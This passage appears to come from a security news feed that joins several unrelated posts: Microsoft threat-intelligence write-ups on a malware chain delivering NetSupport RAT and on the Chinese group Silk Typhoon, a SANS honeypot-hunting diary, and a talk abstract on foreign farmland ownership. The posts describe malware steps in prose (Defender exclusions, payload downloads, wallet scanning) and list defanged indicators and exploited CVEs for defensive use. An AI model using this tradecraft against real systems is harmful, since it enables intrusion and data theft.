.&lt;em&gt;lnk&lt;/em&gt; shortcut in the Windows &lt;em&gt;Startup&lt;/em&gt; folder, ensuring it runs on system reboot.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Second-stage payload: &lt;em&gt;Application.exe&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;PowerShell script: SHA-256: 483796a64f004a684a7bc20c1ddd5c671b41a808bc77634112e1703052666a64&lt;/li&gt;



&lt;li&gt;C2: &lt;em&gt;hxxp:&lt;/em&gt;//&lt;em&gt;5&lt;/em&gt;&lt;em&gt;.10.250[.]240/fakeurl.htm&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The last observed third-stage PowerShell script was dropped by three second-stage payloads. The script sends the compromised device’s name to the C2 server. It then changes the working directory to &lt;em&gt;$env:APPDATA&lt;/em&gt;, before using &lt;em&gt;Start-BitsTransfer&lt;/em&gt; to download NetSupport from the C2. To evade detection, it modifies system security settings forcing TLS1.2 for encrypted C2 communication. These files are extracted into a newly created &lt;em&gt;WinLibraryClient &lt;/em&gt;directory under &lt;em&gt;AppData &lt;/em&gt;and then are launched. The script establishes persistence for the &lt;em&gt;client32.exe (&lt;/em&gt;NetSupport RAT&lt;em&gt;)&lt;/em&gt; by modifying the ASEP registry. &lt;em&gt;Client32.exe&lt;/em&gt; initiates C2 connections to &lt;em&gt;hxxp://79.132.128[.]77/fakeurl.htm&lt;/em&gt;.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Second-stage payloads: &lt;em&gt;SalmonSamurai.exe&lt;/em&gt;, &lt;em&gt;LakerBaker.exe&lt;/em&gt;, and &lt;em&gt;DisplayPhotoViewer.exe&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;PowerShell script: SHA-256: 670218cfc5c16d06762b6bc74cda4902087d812e72c52d6b9077c4c4164856b6&lt;/li&gt;



&lt;li&gt;C2 domain: &lt;em&gt;stocktemplates[.]net&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Additionally, one observed execution included registry enumeration of &lt;em&gt;HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\ &lt;/em&gt;to identify installed applications and security software. It also queries the system’s domain status using Windows Management Instrumentation (WMI) and scans for cryptocurrency wallets, including Ledger Live, Trezor Suite, KeepKey, BCVault, OneKey, and BitBox, indicating potential financial data theft.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="fourth-stage-powershell-analysis"&gt;Fourth-stage PowerShell analysis&lt;/h3&gt;



&lt;p&gt;Depending on the &lt;em&gt;.com&lt;/em&gt; file that ran (like &lt;em&gt;Briefly.com&lt;/em&gt;), the renamed AutoIT file may drop a PowerShell script (SHA-256: &lt;a href="https://www.virustotal.com/gui/file/2a29c9904d1860ea3177da7553c8b1bf1944566e5bc1e71340d9e0ff079f0bd3"&gt;2a29c9904d1860ea3177da7553c8b1bf1944566e5bc1e71340d9e0ff079f0bd3&lt;/a&gt;). The obfuscated PowerShell code uses the &lt;a href="https://learn.microsoft.com/powershell/module/defender/add-mppreference"&gt;&lt;em&gt;Add-MpPreference&lt;/em&gt;&lt;/a&gt; cmdlet to modify Microsoft Defender to add in exclusion paths for Microsoft Defender, so the specified folders are not scanned.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of code depicting the deobfuscated commands to add exclusion paths to Windows Defender." class="wp-image-137798 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image-1.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 5. Deobfuscated commands to add exclusion paths to Windows Defender&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;The script above is sometimes followed by an instance of Base64-encoded PowerShell commands. The PowerShell commands perform the following actions:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Sends a web request to &lt;em&gt;hxxps://360[.]net&lt;/em&gt; and closes the response.&lt;/li&gt;



&lt;li&gt;Sends a web request to &lt;em&gt;hxxps://baidu[.]com&lt;/em&gt; and closes the response.&lt;/li&gt;



&lt;li&gt;Downloads data from &lt;em&gt;hxxps://klipcatepiu0[.]shop/int_clp_sha.txt&lt;/em&gt; using a web client.&lt;/li&gt;



&lt;li&gt;Writes the downloaded data to a memory stream and saves it as a &lt;em&gt;.zip&lt;/em&gt; file named &lt;em&gt;null.zip&lt;/em&gt; (SHA-256: f07b8e5622598c228bfc9bff50838a3c4fffd88c436a7ef77e6214a40b0a2bae) in the &lt;em&gt;C:\Users\&amp;lt;Username&amp;gt;\AppData\Local\Temp&lt;/em&gt; directory.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="recommendations"&gt;Recommendations&lt;/h2&gt;



&lt;p&gt;Microsoft recommends the following mitigations to reduce the impact of this threat.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="strengthen-microsoft-defender-for-endpoint-configuration"&gt;Strengthen Microsoft Defender for Endpoint configuration&lt;/h3&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Ensure that &lt;a href="https://learn.microsoft.com/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection#how-do-i-configure-or-manage-tamper-protection" rel="noreferrer noopener" target="_blank"&gt;tamper protection&lt;/a&gt; is enabled in Microsoft Defender for Endpoint.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Enable &lt;a href="https://learn.microsoft.com/defender-endpoint/enable-network-protection" rel="noreferrer noopener" target="_blank"&gt;network protection&lt;/a&gt; in Microsoft Defender for Endpoint.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Turn on &lt;a href="https://learn.microsoft.com/defender-endpoint/web-protection-overview"&gt;web protection&lt;/a&gt;.&lt;/li&gt;



&lt;li&gt;Run &lt;a href="https://learn.microsoft.com/microsoft-365/security/defender-endpoint/edr-in-block-mode" rel="noreferrer noopener" target="_blank"&gt;endpoint detection and response&amp;nbsp;(EDR) in block mode&lt;/a&gt;&amp;nbsp;so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus does not detect the threat or when Microsoft Defender Antivirus is running in passive mode. EDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-breach.&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Configure &lt;a href="https://learn.microsoft.com/microsoft-365/security/defender-endpoint/automated-investigations" rel="noreferrer noopener" target="_blank"&gt;investigation and remediation&lt;/a&gt; in full automated mode to let Microsoft Defender for Endpoint take immediate action on alerts to resolve breaches, significantly reducing alert volume. &amp;nbsp;&lt;/li&gt;



&lt;li&gt;Microsoft Defender XDR customers can turn on the following&amp;nbsp;&lt;a href="https://learn.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction" rel="noreferrer noopener" target="_blank"&gt;attack surface reduction rules&lt;/a&gt;&amp;nbsp;to prevent common attack techniques used by threat actors.&amp;nbsp;&lt;ul&gt;&lt;li&gt;&lt;a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference#block-executable-files-from-running-unless-they-meet-a-prevalence-age-or-trusted-list-criterion" rel="noreferrer noopener" target="_blank"&gt;Block&lt;/a&gt; executable files from running unless they meet a prevalence, age, or trusted list criterion&amp;nbsp;&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference#block-execution-of-potentially-obfuscated-scripts"&gt;Block&lt;/a&gt; execution of potentially obfuscated scripts&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://learn.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference#block-javascript-or-vbscript-from-launching-downloaded-executable-content"&gt;Block&lt;/a&gt; JavaScript or VBScript from launching downloaded executable content&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference#block-process-creations-originating-from-psexec-and-wmi-commands"&gt;Block&lt;/a&gt; process creations originating from PSExec and WMI commands&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference#block-credential-stealing-from-the-windows-local-security-authority-subsystem" rel="noreferrer noopener" target="_blank"&gt;Block&lt;/a&gt; credential stealing from the Windows local security authority subsystem&amp;nbsp;&lt;/li&gt;&lt;/ul&gt;

&lt;/li&gt;
&lt;/ul&gt;



&lt;h3 class="wp-block-heading" id="strengthen-operating-environment-configuration"&gt;Strengthen operating environment configuration&lt;/h3&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Require &lt;a href="https://learn.microsoft.com/microsoft-365/admin/security-and-compliance/set-up-multi-factor-authentication"&gt;multifactor authentication (MFA)&lt;/a&gt;. While certain attacks such as adversary-in-the-middle (AiTM) phishing attempt to circumvent MFA, implementation of MFA remains an essential pillar in identity security and is highly effective at stopping a variety of threats.
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Leverage &lt;a href="https://learn.microsoft.com/entra/identity/authentication/concept-authentication-methods"&gt;phishing-resistant authentication methods&lt;/a&gt; such as FIDO Tokens, or &lt;a href="https://www.microsoft.com/security/mobile-authenticator-app"&gt;Microsoft Authenticator&lt;/a&gt; with passkey. Avoid telephony-based MFA methods to avoid risks associated with SIM-jacking.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;Implement&amp;nbsp;Entra ID&amp;nbsp;&lt;a href="https://learn.microsoft.com/azure/active-directory/authentication/concept-authentication-strengths"&gt;Conditional Access authentication strength&lt;/a&gt;&amp;nbsp;to require phishing-resistant authentication for employees and external users for critical apps.&lt;/li&gt;



&lt;li&gt;Encourage users to use Microsoft Edge and other web browsers that support &lt;a href="https://learn.microsoft.com/deployedge/microsoft-edge-security-smartscreen"&gt;Microsoft Defender SmartScreen&lt;/a&gt;, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that host malware.&lt;/li&gt;

The 3 logs used for traffic analysis are cowrie, webhoneypot and the firewall logs. Other options to add to the honeypot are packet capture, netflow and Zeek.&lt;/p&gt;

&lt;p&gt;Using the following steps, I was able to start selecting what could be interesting activity by using a few simple steps in the interface. This search can take place over 24 hours to several days depending on the data stored and available.&lt;/p&gt;

&lt;p&gt;First, I'm going to look at some of the basic traffic collected by the honeypot using the firewall data. I'm going to set the time range to start at 7 days and select &lt;strong&gt;DShield - Traffic Analytic&lt;/strong&gt;. My search is going to be simple, look for Source Port or IPID that could be associated with some tools that might be associated with potential reconnaissance captured by the firewall. Anything that is static with a high count might be something to use as a starting point (port equal to 0, IPID equal to 1, 54321, etc). In this case, I'm selecting IPID 54321 as a starting point.&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/DShield_firewall_scanning.png" style="width: 857px; height: 146px;" /&gt;&lt;/p&gt;

&lt;p&gt;Now that I have made a choice, I look for the past 30 days and found the activity range between 4 Feb 2025 - 6 March 2025 and here is the result after selecting 54321:&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/DShield_firewall_scanning1.png" style="width: 1154px; height: 189px;" /&gt;&lt;/p&gt;

&lt;p&gt;My next step, I want to see traffic that all the sensors have captured from this source, using the following filter, using a &lt;a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl.html"&gt;DSL&lt;/a&gt; query, this will show all 3 sensors where this IP was captured by the firewall:&lt;br /&gt;
&lt;span style="font-family: Courier New,Courier,monospace;"&gt;{&lt;br /&gt;
&amp;nbsp; &amp;quot;terms&amp;quot;: {&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;host.name&amp;quot;: [&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;picollector&amp;quot;,&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;collector&amp;quot;,&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;vps-711a413c&amp;quot;&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp; ]&lt;br /&gt;
&amp;nbsp; }&lt;br /&gt;
}&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Next, I selected one of the IPs that all 3 sensors captured traffic from it:&lt;br /&gt;
&lt;span style="font-family: Courier New,Courier,monospace;"&gt;related.ip : 193.68.89.10&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;The activity from this IP started on the 5 February at 12:00 UTC and has been basically scanning ever since with a small stop gap between the 11-13 Feb and completely stopped on the 4 March 12:00 UTC&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/DShield_firewall_scanning_overall.png" style="width: 700px; height: 537px;" /&gt;&lt;/p&gt;

&lt;p&gt;I temporary disable the IPID 54321 to see all the DShield sensor data captured over time. For this IP, only web honeypot and firewall data exists. During that time period, there were no attempts to login the sensor. This also presents a completely different picture of the activity. The 15 February shows a huge spike of web activity.&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/DShield_firewall_scanning_overall_webhoneypot.png" style="width: 700px; height: 544px;" /&gt;&lt;/p&gt;

&lt;p&gt;Next, going to &lt;strong&gt;DShield - Web Analytic&lt;/strong&gt;, the only web activity by this IP is &lt;span style="font-family: Courier New,Courier,monospace;"&gt;GET&lt;/span&gt; &amp;amp; &lt;span style="font-family: Courier New,Courier,monospace;"&gt;HEAD / &lt;/span&gt;and 2 different user-agents.&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/DShield_firewall_webhoneypot.png" style="width: 1000px; height: 94px;" /&gt;&lt;/p&gt;

&lt;p&gt;In &lt;strong&gt;DShield - Vega-Lite&lt;/strong&gt;, what I find sometimes interesting is the Time-to-Live (TTL) overtime where all the activity isn't sitting around the same cluster. For example, looking at the picture below, we have two TTL cluster for the same source IP. One between 237-240 and the other between 47-49. Why a difference in the time the packet was sent to receive by the sensor? Different routes, proxy, crafting, etc.&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/DShield_firewall_TTL.png" style="width: 700px; height: 436px;" /&gt;&lt;/p&gt;

&lt;p&gt;In &lt;strong&gt;DShield - SIEM Alerts&lt;/strong&gt;, this source IP also alerted from some of the threat intel tracked by the SIEM [&lt;a href="https://github.com/bruneaug/DShield-SIEM"&gt;1&lt;/a&gt;][&lt;a href="http://https://github.com/bruneaug/DShield-Sensor"&gt;2&lt;/a&gt;].&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/DShield_firewall_threatintel.png" style="width: 1000px; height: 121px;" /&gt;&lt;/p&gt;

&lt;p&gt;This analysis could also use packets and Zeek if captured to dig further in the data the basic sensor logs have stored. These were simple steps to perform some retrospective analysis over time of a single IP that took at the most 10 minutes. Happy threat hunting!&lt;/p&gt;

In this deep dive into the secretive world of foreign investment in U.S. agricultural land, Kristin Del Rosso and Madeleine Devost explore the growing trend of foreign ownership, which has surged by 50% since 2017, and its profound implications for national security. Using the USDA’s data, the presenters shed light on how these investments could potentially impact everything from local economies to national defense.&lt;/p&gt;
&lt;p&gt;The talk dives into the complexities of the USDA’s data collection methods, revealing how manual processes and outdated systems obscure the true extent of foreign ownership. It also discusses the critical role of the Committee on Foreign Investment in the United States (CFIUS) in safeguarding national interests, and the urgent need for improved data sharing and automation between CFIUS and the USDA.&lt;/p&gt;
&lt;p&gt;Through real-life examples, including controversial land purchases near sensitive military sites, Kristin and Madeleine illustrate the potential risks and propose actionable recommendations to enhance transparency and security.&lt;/p&gt;

In recent months, Silk Typhoon has shifted to performing IT supply chain attacks to gain access to targets. In this blog, we provide an overview of the threat actor along with insight into their recent activity as well as their longstanding tactics, techniques, and procedures (TTPs), including a persistent interest in the exploitation of zero-day vulnerabilities in various public-facing appliances and moving from on-premises to cloud environments.&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/03/05/silk-typhoon-targeting-it-supply-chain/"&gt;Silk Typhoon targeting IT supply chain&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;blockquote class="wp-block-quote blockquote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;strong&gt;Executive summary:&lt;/strong&gt;&lt;br /&gt;Microsoft Threat Intelligence identified a shift in tactics by Silk Typhoon, a Chinese espionage group, now targeting common IT solutions like remote management tools and cloud applications to gain initial access. While they haven&amp;#8217;t been observed directly targeting Microsoft cloud services, they do exploit unpatched applications that allow them to elevate their access in targeted organizations and conduct further malicious activities. After successfully compromising a victim, Silk Typhoon uses the stolen keys and credentials to infiltrate customer networks where they can then abuse a variety of deployed applications, including Microsoft services and others, to achieve their espionage objectives. Our latest blog explains how Microsoft security solutions detect these threats and offers mitigation guidance, aiming to raise awareness and strengthen defenses against Silk Typhoon&amp;#8217;s activities.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;Silk Typhoon is an espionage-focused Chinese state actor whose activities indicate that they are a well-resourced and technically efficient group with the ability to quickly operationalize exploits for discovered zero-day vulnerabilities in edge devices. This threat actor holds one of the largest targeting footprints among Chinese threat actors. Part of this is due to their opportunistic nature of acting on discoveries from vulnerability scanning operations, moving quickly to the exploitation phase once they discover a vulnerable public-facing device that they could exploit.&lt;/p&gt;



&lt;p&gt;As a result, Silk Typhoon has been observed targeting a wide range of sectors and geographic regions, including but not limited to information technology (IT) services and infrastructure, remote monitoring and management (RMM) companies, managed service providers (MSPs) and affiliates, healthcare, legal services, higher education, defense, &amp;nbsp;government, non-governmental organizations (NGOs), energy, and others located in the United States and throughout the world.&lt;/p&gt;



&lt;p&gt;Silk Typhoon has shown proficiency in understanding how cloud environments are deployed and configured, allowing them to successfully move laterally, maintain persistence, and exfiltrate data quickly within victim environments. Since Microsoft Threat Intelligence began tracking this threat actor in 2020, Silk Typhoon has used a myriad of web shells that allow them to execute commands, maintain persistence, and exfiltrate data from victim environments.&lt;/p&gt;



&lt;p&gt;As with any observed nation-state threat actor activity, Microsoft has directly notified targeted or compromised customers, providing them with important information needed to secure their environments. We’re publishing this blog to raise awareness of Silk Typhoon&amp;#8217;s recent and long-standing malicious activities, provide mitigation and hunting guidance, and help disrupt operations by this threat actor.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="recent-silk-typhoon-activity"&gt;Recent Silk Typhoon activity&lt;/h2&gt;



&lt;h3 class="wp-block-heading" id="supply-chain-compromise"&gt;Supply chain compromise&lt;/h3&gt;



&lt;p&gt;Since late 2024, Microsoft Threat Intelligence has conducted thorough research and tracked ongoing attacks performed by Silk Typhoon. These efforts have significantly enhanced our understanding of the actor&amp;#8217;s operations and uncovered new tradecraft used by the actor. In particular, Silk Typhoon was observed abusing stolen API keys and credentials associated with privilege access management (PAM), cloud app providers, and cloud data management companies, allowing the threat actor to access these companies’ downstream customer environments. Companies within these sectors are possible targets of interest to the threat actor. The observations below were observed once Silk Typhoon successfully stole the API key:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Silk Typhoon used stolen API keys to access downstream customers/tenants of the initially compromised company.&lt;/li&gt;



&lt;li&gt;Leveraging access obtained via the API key, the actor performed reconnaissance and data collection on targeted devices via an admin account. Data of interest overlaps with China-based interests, US government policy and administration, and legal process and documents related to law enforcement investigations.&lt;/li&gt;



&lt;li&gt;Additional tradecraft identified included resetting of default admin account via API key, web shell implants, creation of additional users, and clearing logs of actor-performed actions.&lt;/li&gt;



&lt;li&gt;Thus far the victims of this downstream activity were largely in the state and local government, and the IT sector.&lt;/li&gt;
&lt;/ul&gt;



&lt;h3 class="wp-block-heading" id="password-spray-and-abuse"&gt;Password spray and abuse&lt;/h3&gt;



&lt;p&gt;Silk Typhoon has also gained initial access through successful password spray attacks and other password abuse techniques, including discovering passwords through reconnaissance. In this reconnaissance activity, Silk Typhoon leveraged leaked corporate passwords on public repositories, such as GitHub, and were successfully authenticated to the corporate account. This demonstrates the level of effort that the threat actor puts into their research and reconnaissance to collect victim information and highlights the importance of password hygiene and the use of multifactor authentication (MFA) on all accounts.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="silk-typhoon-ttps"&gt;Silk Typhoon TTPs&lt;/h2&gt;



&lt;h3 class="wp-block-heading" id="initial-access"&gt;Initial access&lt;/h3&gt;



&lt;p&gt;Silk Typhoon has pursued initial access attacks against targets of interest through development of zero-day exploits or discovering and targeting vulnerable third-party services and software providers. Silk Typhoon has also been observed gaining initial access via compromised credentials. The software or services targeted for initial access focus on IT providers, identity management, privileged access management, and RMM solutions.&lt;/p&gt;



&lt;p&gt;In January 2025, Silk Typhoon was also observed exploiting a zero-day vulnerability in the public facing Ivanti Pulse Connect VPN (&lt;a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-Policy-Secure-ZTA-Gateways-CVE-2025-0282-CVE-2025-0283"&gt;CVE-2025-0282&lt;/a&gt;). Microsoft Threat Intelligence Center reported the activity to Ivanti, which led to a rapid resolution of the critical exploit, significantly reducing the period that highly skilled and sophisticated threat actors could leverage the exploit.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="lateral-movement-to-cloud"&gt;Lateral movement to cloud&lt;/h3&gt;



&lt;p&gt;Once a victim has been successfully compromised, Silk Typhoon is known to utilize common yet effective tactics to move laterally from on-premises environments to cloud environments. Once the threat actor has gained access to an on-premises environment, they look to dump Active Directory, steal passwords within key vaults, and escalate privileges. Furthermore, Silk Typhoon has been observed targeting Microsoft AADConnect servers in these post-compromise activities. AADConnect (now Entra Connect) is a tool that synchronizes on-premises Active Directory with Entra ID (formerly Azure AD). A successful compromise of these servers could allow the actor to escalate privileges, access both on-premises and cloud environments, and move laterally.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="manipulating-service-principals-applications"&gt;Manipulating service principals/applications&lt;/h3&gt;



&lt;p&gt;While analyzing post-compromise tradecraft, Microsoft identified Silk Typhoon abusing service principals and OAuth applications with administrative permissions to perform email, OneDrive, and SharePoint data exfiltration via MSGraph. Throughout their use of this technique, Silk Typhoon has been observed gaining access to an application that was already consented within the tenant to harvest email data and adding their own passwords to the application. Using this access, the actors can steal email information via the MSGraph API. Silk Typhoon has also been observed compromising multi-tenant applications, potentially allowing the actors to move across tenants, access additional resources within the tenants, and exfiltrate data.&lt;/p&gt;



&lt;p&gt;If the compromised application had privileges to interact with the Exchange Web Services (EWS) API, the threat actors were seen compromising email data via EWS.&lt;/p&gt;



&lt;p&gt;In some instances, Silk Typhoon was seen creating Entra ID applications in an attempt to facilitate this data theft. The actors would typically name the application in a way to blend into the environment by using legitimate services or Office 365 themes.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="use-of-covert-networks"&gt;Use of covert networks&lt;/h3&gt;



&lt;p&gt;Silk Typhoon is known to utilize covert networks to obfuscate their malicious activities. Covert networks, tracked by Microsoft as “CovertNetwork”, refer to a collection of egress IPs consisting of compromised or leased devices that may be used by one or more threat actors. Silk Typhoon was observed utilizing a covert network that is comprised of compromised Cyberoam appliances, Zyxel routers, and QNAP devices. The &lt;a href="https://www.microsoft.com/security/blog/2024/10/31/chinese-threat-actor-storm-0940-uses-credentials-from-password-spray-attacks-from-a-covert-network/"&gt;use of covert networks&lt;/a&gt; has become a common tactic among various threat actors, particularly Chinese threat actors.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="historical-silk-typhoon-zero-day-exploitation"&gt;Historical Silk Typhoon zero-day exploitation&lt;/h2&gt;



&lt;p&gt;Since 2021, Silk Typhoon has been observed targeting and compromising vulnerable unpatched Microsoft Exchange servers, GlobalProtect Gateway on Palo Alto Networks firewalls, Citrix NetScaler appliances, Ivanti Pulse Connect Secure appliances, and others. While not exhaustive, below are historical zero-day vulnerabilities that Silk Typhoon was observed compromising for initial access into victim environments.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="globalprotect-gateway-on-palo-alto-networks-firewalls"&gt;GlobalProtect Gateway on Palo Alto Networks Firewalls&lt;/h3&gt;



&lt;p&gt;In March 2024, Silk Typhoon used a zero-day exploit for CVE-2024-3400 in GlobalProtect Gateway on Palo Alto Networks firewalls to compromise multiple organizations:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3400"&gt;CVE-2024-3400&lt;/a&gt; &amp;#8211; A command injection as a result of arbitrary file creation vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.&lt;/li&gt;
&lt;/ul&gt;



&lt;h3 class="wp-block-heading" id="citrix-netscaler-adc-and-netscaler-gateway"&gt;Citrix NetScaler ADC and NetScaler Gateway&lt;/h3&gt;



&lt;p&gt;In early 2024, Microsoft began to observe Silk Typhoon compromising zero-day vulnerabilities within Citrix NetScaler ADC and NetScaler Gateways:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://support.citrix.com/s/article/CTX561482-citrix-adc-and-citrix-gateway-security-bulletin-for-cve20233519-cve20233466-cve20233467?language=en_US"&gt;CVE-2023-3519&lt;/a&gt; &amp;#8211; An unauthenticated remote code execution (RCE) vulnerability affecting NetScaler (formerly Citrix) Application Delivery Controller (ADC) and NetScaler Gateway&lt;/li&gt;
&lt;/ul&gt;



&lt;h3 class="wp-block-heading" id="microsoft-exchange-servers"&gt;Microsoft Exchange Servers&lt;/h3&gt;



&lt;p&gt;In January 2021, Microsoft began to observe &lt;a href="https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"&gt;Silk Typhoon compromising zero-day vulnerabilities in Microsoft Exchange Servers&lt;/a&gt;. Upon discovery, Microsoft addressed those issues and issued security updates along with related guidance (related links below):&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855"&gt;CVE-2021-26855&lt;/a&gt; &amp;#8211; A server-side request forgery (SSRF) vulnerability in Exchange that could allow an attacker to send arbitrary HTTP requests and authenticate as the Exchange server.&lt;/li&gt;



&lt;li&gt;&lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26857"&gt;CVE-2021-26857&lt;/a&gt; &amp;#8211; An insecure deserialization vulnerability in the Unified Messaging service. Insecure deserialization is where untrusted user-controllable data is deserialized by a program. Exploiting this vulnerability gave Silk Typhoon the ability to run code as SYSTEM on the Exchange server. This requires administrator permission or another vulnerability to be exploited.&lt;/li&gt;



&lt;li&gt;&lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858"&gt;CVE-2021-26858&lt;/a&gt; &amp;#8211; A post-authentication arbitrary file write vulnerability in Exchange. If Silk Typhoon could authenticate with the Exchange server, then it could use this vulnerability to write a file to any path on the server. It could authenticate by exploiting the CVE-2021-26855 SSRF vulnerability or by compromising a legitimate administrator&amp;#8217;s credentials.&lt;/li&gt;



&lt;li&gt;&lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065"&gt;CVE-2021-27065&lt;/a&gt; &amp;#8211; A post-authentication arbitrary file write vulnerability in Exchange. If Silk Typhoon could authenticate with the Exchange server, then it could use this vulnerability to write a file to any path on the server. It could authenticate by exploiting the CVE-2021-26855 SSRF vulnerability or by compromising a legitimate administrator&amp;#8217;s credentials.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;During recent activities and historical exploitation of these appliances, Silk Typhoon utilized a variety of web shells to maintain persistence and to allow the actors to remotely access victim environments.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="hunting-guidance"&gt;Hunting guidance&lt;/h2&gt;



&lt;p&gt;To help mitigate and surface various aspects of recent Silk Typhoons activities, Microsoft recommends the following:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Inspect log activity related to Entra Connect serversfor anomalousactivity.&lt;/li&gt;



&lt;li&gt;Where these targeted applications have highly privileged accounts, inspect service principals for newly created secrets (credentials).&lt;/li&gt;



&lt;li&gt;Identify and analyze any activity related to newly created applications.&lt;/li&gt;



&lt;li&gt;Identify all multi-tenant applications and scrutinize authentications to them.&lt;/li&gt;



&lt;li&gt;Analyze any observed activity related to use of Microsoft Graph or eDiscovery particularly for SharePoint or email data exfiltration&lt;/li&gt;



&lt;li&gt;Look for newly created users on devices impacted by vulnerabilities targeted by Silk Typhoon and investigate virtual private network (VPN) logs for evidence of VPN configuration modifications or sign-in activity during the possible window of compromise of unpatched devices.&lt;/li&gt;
&lt;/ul&gt;



&lt;h3 class="wp-block-heading" id="microsoft-sentinel"&gt;Microsoft Sentinel&lt;/h3&gt;



&lt;p&gt;Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the &lt;a href="https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy"&gt;Microsoft Sentinel Content Hub&lt;/a&gt; to have the analytics rule deployed in their Sentinel workspace.&lt;/p&gt;



